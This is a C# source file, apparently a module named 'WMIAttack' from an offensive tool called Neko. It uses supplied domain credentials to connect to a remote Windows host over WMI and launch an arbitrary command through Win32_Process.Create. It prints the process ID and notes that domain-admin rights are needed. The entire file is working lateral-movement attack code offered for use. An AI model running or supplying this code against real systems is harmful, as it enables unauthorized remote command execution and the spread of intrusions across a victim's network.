using System;
using System.Management;

namespace Neko.UserChoices
{
    class WMIAttack
    {
        // For attacking found WMI targets later
        public static void Parameters(string Username, string Password, string domainURL, string hostname, string commandFile)
        {
            try
            {
                Console.WriteLine("Attacking " + hostname + " via WMI..");
                // Set connection options
                ConnectionOptions options = new ConnectionOptions();
                // Set impersonation level
                options.Impersonation = ImpersonationLevel.Impersonate;
                // Pipe in and set username
                options.Username = Username;
                // Set password
                options.Password = Password;
                // Set authority
                options.Authority = "ntlmdomain:" + GetDomainInfo.DomainURL;

                // Define scope
                ManagementScope scope = new ManagementScope("\\\\" + hostname + "\\root\\cimv2", options);
                scope.Connect();

                // Set options
                ObjectGetOptions objectGetOptions = new ObjectGetOptions();
                // Management path
                ManagementPath managementPath = new ManagementPath("Win32_Process");
                // Class
                ManagementClass processClass = new ManagementClass(scope, managementPath, objectGetOptions);

                // Create method parameters
                ManagementBaseObject inParams = processClass.GetMethodParameters("Create");

                // Set command line from previously entered value
                inParams["CommandLine"] = commandFile;

                // Create the process
                ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);

                // Convert return value to string and see if it's 0, which indicates success
                if (Convert.ToString(outParams["returnValue"]) == "0")
                {
                    Console.WriteLine("Remote process successfully created.");
                    Console.WriteLine("Process ID: " + outParams["processId"]);
                }
                else
                {
                    Console.WriteLine("Creation of remote process returned " + outParams["returnValue"] + " - failed");
                }
            }
            // Catch access denied error
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine(e + "Access Denied, insufficient privileges. Confirm that account is domain admin.");
            }
            // Catch local machine error.
            catch (ManagementException e)
            {
                if (e.Message.Contains("User credentials"))
                {
                    Console.WriteLine("Cannot use on local machine");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
